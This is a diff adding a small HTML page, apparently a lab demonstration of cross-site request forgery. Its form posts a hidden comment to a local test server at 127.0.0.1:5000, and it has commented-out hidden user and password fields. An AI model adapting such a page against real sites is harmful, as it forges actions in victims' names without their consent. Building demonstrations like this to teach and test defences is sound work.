@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Page</title>
+</head>
+<body>
+    <h1>CSRF Attack Page</h1>
+    <form id="csrfForm" action="http://127.0.0.1:5000/" method="POST">
+        <input type="hidden" name="comment" value="This is a CSRF attack comment!">
+        <!-- <input type="hidden" name="user_id" value="target_user">
+        <input type="hidden" name="password" value="target_password"> -->
+        <input type="submit" value="点我实现csrf攻击" />
+    </form>
+
+    <script type="text/javascript">
+        document.getElementById('csrfForm').addEventListener('submit', function(event) {
+            if (this.getAttribute('data-submitted') === 'true') {
+                event.preventDefault();
+            } else {
+                this.setAttribute('data-submitted', 'true');
+            }
+        });
+    </script>
+</body>
